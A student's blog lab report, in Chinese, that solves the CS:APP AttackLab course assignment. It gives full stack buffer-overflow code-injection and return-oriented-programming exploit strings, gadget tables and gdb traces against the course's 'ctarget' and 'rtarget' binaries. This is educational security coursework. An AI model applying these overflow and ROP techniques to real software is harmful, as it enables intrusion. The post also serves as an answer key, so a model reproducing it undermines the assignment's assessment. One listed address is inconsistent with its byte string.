---
title: AttackLab
date: 2018-12-08 13:51:01
tags: 实验报告
categories:
	- 课程学习
---
# 实验环境
1. macOS Mojave 10.14.1
2. iTerm2 终端

# 实验内容
详见 [http://csapp.cs.cmu.edu/3e/attacklab.pdf](http://csapp.cs.cmu.edu/3e/attacklab.pdf)
<!--more-->
# 开始吧
准备工作：

- 登陆学校服务器

`ssh xxxxxxxxxx@10.120.11.13`

- 解压target

`tar -xvf target99.tar`

- 将实验所需要的两个程序`ctarget`和`rtarget`反汇编

`objdump -d ctarget > dis`
`objdump -d rtarget > dis2`

正式开始：

## Part I: Code Injection Attacks
### Level 1
根据实验内容pdf文档可以知道，这项内容是让我通过一些操作触发`touch1`函数。文档中提供了`getbuf`函数、`test`函数和`touch1`函数的C语言代码：

```c
unsigned getbuf() 
{
	char buf[BUFFER_SIZE];
	Gets(buf);
	return 1;
}

void test()
{
	int val;
	val = getbuf();
	printf("No exploit. Getbuf returned 0x%x\n", val);
}

void touch1() 
{
	vlevel = 1;         /* Part of validation protocol */
	printf("Touch1!: You called touch1()\n");
	validate(1);	
	exit(0);
}
```
我们可以看出getbuf会从缓冲区读入数据存入buf数组中，而我就可以利用这个buf数组的大小限制对代码进行攻击，使得`getbuf`执行完后不返回到`test`，而是跳转到`touch1`从而达到目的。        
接下来需要找到`BUFFER_SIZE`的大小。因此查看getbuf函数的反汇编代码：

```x86asm
0000000000401768 <getbuf>:
401768:       48 83 ec 18             sub    $0x18,%rsp
40176c:       48 89 e7                mov    %rsp,%rdi
40176f:       e8 36 02 00 00          callq  4019aa <Gets>
401774:       b8 01 00 00 00          mov    $0x1,%eax
401779:       48 83 c4 18             add    $0x18,%rsp
40177d:       c3                      retq
40177e:       66 90                   xchg   %ax,%ax
```
看到一开始`%rsp`减少了0x18可以判断出，这个buffer的大小就是0x18个字节，即24个字节。也就是说，我需要将这24个字节填满，再注入一条`touch1`的返回地址即可将原返回地址覆盖，使得`getbuf`之后返回到`touch1`.

查看`touch1`的反汇编代码可以得到它的地址为`0x401780`。
因为实验环境为**小端机器**，所以我们可以构造输入的攻击代码段为：

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
80 17 40 00 00 00 00 00
```
按照attacklab.pdf中介绍的方法我们对`ctarget`进行攻击:
`./hex2raw < phase1 | ./ctarget`    

程序运行提示成功：

```
Cookie: 0x286582b8
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
```

### Level 2
先来看touch2的代码：

```c
void touch2(unsigned val)
{
	vlevel = 2;       /* Part of validation protocol */
	if (val == cookie) {
	printf("Touch2!: You called touch2(0x%.8x)\n", val);
	validate(2); 
	}
	else {
	printf("Misfire: You called touch2(0x%.8x)\n", val);
	fail(2); 
	}
	exit(0); 
}
```
从这段代码看出来我需要为`touch2`设置一个参数val，它的值为target为我提供的cookie:`0x286582b8`，所以这次攻击与上一次唯一的区别就是我在返回到`touch2`之前必须要它的第一个参数设置为cookie的值。而函数的第一个参数都存在寄存器`%rdi`中，于是我需要构造一段代码将cookie的值存到`%rdi`中，并设置`%rsp`中新的返回地址为存储`touch2`地址的栈中地址：

```x86asm
movq $0x286582b8, %rdi
movq $0x5567b418, %rsp
ret
```
将编译后反汇编：

```x84asm
0:   48 c7 c7 b8 82 65 28    mov    $0x286582b8,%rdi
7:   48 c7 c4 18 b4 67 55    mov    $0x5567b418,%rsp
e:   c3                      retq
```
可以得到这段指令的机器代码。而它就是我需要注入到程序中的攻击代码。另外我们需要将返回地址设置为到这段代码（指令）的地址，即`getbuf`函数执行后`%rsp`中存储的地址。运行gdb到`getbuf`分配内存后的指令，并查看`%rsp`中的值：

```
(gdb) b getbuf
Breakpoint 1 at 0x401768: file buf.c, line 12.
(gdb) r
Starting program: /home/students/2017211613/target99/ctarget
sCookie: 0x286582b8

Breakpoint 1, getbuf () at buf.c:12
12    buf.c: No such file or directory.
(gdb) s
14    in buf.c
(gdb) disas
Dump of assembler code for function getbuf:
0x0000000000401768 <+0>:    sub    $0x18,%rsp
=> 0x000000000040176c <+4>:    mov    %rsp,%rdi
0x000000000040176f <+7>:    callq  0x4019aa <Gets>
0x0000000000401774 <+12>:    mov    $0x1,%eax
0x0000000000401779 <+17>:    add    $0x18,%rsp
0x000000000040177d <+21>:    retq
End of assembler dump.
(gdb) p/x $rsp
$1 = 0x5567b408
```
可以得到此段栈帧的栈顶地址为`0x5567b408`，然后与之前一样得到`touch2`的地址：`0x4017ac`
这样我就得到这次攻击的代码段：

```
48 c7 c7 b8 82 65 28 48
c7 c4 18 b4 67 55 c3 00
ac 17 40 00 00 00 00 00
08 b4 67 55 00 00 00 00
```
注入攻击：`./hex2raw < phase2 | ./ctarget`

成功:

```
Cookie: 0x286582b8
Type string:Touch2!: You called touch2(0x286582b8)
Valid solution for level 2 with target ctarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
```

### Level 3
先来康康`touch3`的代码：

```c
/* Compare string to hex represention of unsigned value */
int hexmatch(unsigned val, char *sval)
{
	char cbuf[110];
	/* Make position of check string unpredictable */
	char *s = cbuf + random() % 100;
	sprintf(s, "%.8x", val);
	return strncmp(sval, s, 9) == 0;
}

void touch3(char *sval)
{
	vlevel = 3;       /* Part of validation protocol */
	if (hexmatch(cookie, sval)) {
	printf("Touch3!: You called touch3(\"%s\")\n", sval);
	validate(3);
	} 
	else {
	printf("Misfire: You called touch3(\"%s\")\n", sval);
	fail(3);
	}
	exit(0); 
}
```
可以看出，这个和level2其实差不多，区别在于cookie在此需要以字符串的形式保存，而且传入`touch3`的参数是这段字符串的地址。按照和之前一样的步骤，先找到`touch3`的地址：`0x401880`，`getbuf`栈帧栈顶地址`0x5567b408`不变。cookie字符串所对应的16进制为：`32 38 36 35 38 32 62 38
00`（**因为是字符串所以最后有字符'\0'**）。因为buffsize有限，所以我将cookie存在更后面的位置。        
与level2同理，写出一些需要改变寄存器值的操作：

```x86asm
movq $0x5567b428, %rdi
movq $0x5567b410, %rsp
ret
```
将其编译后反汇编得到机器代码

```
48 c7 c7 08 b4 67 55    
48 c7 c4 10 b4 67 55    
c3
```
然后就得出了最后的攻击代码：

```
48 c7 c7 28 b4 67 55 48
c7 c4 18 b4 67 55 c3 00
80 18 40 00 00 00 00 00
08 b4 67 55 00 00 00 00
32 38 36 35 38 32 62 38
00
```
注入攻击：`./hex2raw < phase3 | ./ctarget`
成功：

```
Cookie: 0x286582b8
Type string:Touch3!: You called touch3("286582b8")
Valid solution for level 3 with target ctarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
```

## Part II: Return-Oriented Programming
### Level 2
老师上课讲了ROP的基本思想，因为栈的保护机制，我们无法像Part I中一样获取栈的地址，而且插入的代码也无法执行，但我们还可以通过程序中存在的一些函数，它们的机器代码通过截取一段可以构成新的不同意义的指令（带`ret`）。而这些指令就可以帮助我完成攻击。    
通过查表并对应farm中的反汇编代码，我整理出来了一些可用的gadgets（都带有ret）：

|函数名|对应指令|指令的起始地址|
|----|----|----|
|`setval_487`|`movq %rax,%rdi`|`0x401917`|
|`setval_487`|`movl %eax,%edi`|`0x401918`|
|`addval_207`|`popq %rax`|`0x401925`|
|`setval_316`|`popq %rax`|`0x401941`|
|`setval_153`|`movl %esp,%eax`|`0x40197f`|
|`setval_181`|`movl %ecx,%edx`|`0x401994`|
|`addval_103`|`movq %rsp,%rax`|`0x4019ae`|
|`getval_178`|`movl %eax,%ecx`|`0x4019d5`|
|`getval_308`|`movl %edx,%esi`|`0x4019f0`|
|`add_xy`|`lea (%rdi,%rsi,1),%rax`|`0x40194a`|
要触发`touch2`，我将栈构造如下（高地址到低地址，8字节一个单位）：

|栈底|
|:---:|
|……|
|`&touch2`|
|`movq %rax,%rdi`<br>`ret`|
|cookie:`0x286582b8`|
|`popq %rax`<br>`ret`| 
|`buf`的24个字节|
|栈顶|
根据以上信息对照我列出的gadgets表可以构造出phase4代码：

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
41 19 40 00 00 00 00 00
b8 82 65 28 00 00 00 00
17 19 40 00 00 00 00 00
ac 17 40 00 00 00 00 00
```
注入攻击：`./hex2raw < phase4 | ./rtarget`
成功：

```
Cookie: 0x286582b8
Type string:Touch2!: You called touch2("286582b8")
Valid solution for level 2 with target rtarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
```

### Level 3
最终目的和Part I中的level3一样，要将cookie所在字符串的地址传入`%rdi`并触发`touch3`。
我构造了这样一个步骤：

|栈底|
|:---:|
|……|
|cookie:`0x323836353832623800`
|`&touch3`|
|`movq %rax,%rdi`|
|`lea (%rdi,%rsi,1),%rax`|
|`movq %rax,%rdi`|
|`movq %rsp,%rax`|
|`movl %edx,%esi`|
|`movl %ecx,%edx`|
|`movl %eax,%ecx`|
| bias:`0x20`|
|`popq %rax`<br>`ret`| 
|`buf`的24个字节|
|栈顶|
再对照我列的gadgets表写出攻击代码：

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
41 19 40 00 00 00 00 00
20 00 00 00 00 00 00 00
d5 19 40 00 00 00 00 00
94 19 40 00 00 00 00 00
f0 19 40 00 00 00 00 00
ae 19 40 00 00 00 00 00
17 19 40 00 00 00 00 00
4a 19 40 00 00 00 00 00
17 19 40 00 00 00 00 00
80 18 40 00 00 00 00 00
32 38 36 35 38 32 62 38
00
```
注入攻击：`./hex2raw < phase5 | ./rtarget`
成功：

```
Cookie: 0x286582b8
Type string:Touch3!: You called touch3("286582b8")
Valid solution for level 3 with target rtarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
```
**本次实验结束**
# 总结体会
这次的AttackLab相比于上次的BombLab更让我感觉pro了一点。这次的实验让我体验了一把黑客的感觉。虽然现在不可能有那么简单的漏洞能让我这么轻易的攻击。    
这次主要是考察了我对函数调用以及栈的理解。在做最后一个攻击的时候我犯了一个很弱智的错误，那就是把地址放在32位寄存器里传递，浪费了我半个小时的睡眠时间。    
在某些意义上这次实验比上一次实验还更为简单，只要掌握了对机器执行指令时栈以及相关寄存器的作用很容易就能完成本次实验。<font color=RED>**不过我们实验发的也太晚了吧，九点过才发，我开始做的时候其他一个班的大佬都已经做完了。而且我本来就做得慢，~~晚上看动画片的时间都耽搁了~~。**</font>不过还好在熄灯前把它弄完了。    
这学期唯一有计算机专业感觉的课就只有这门课了，希望老师给我们带来更多有趣的知识。
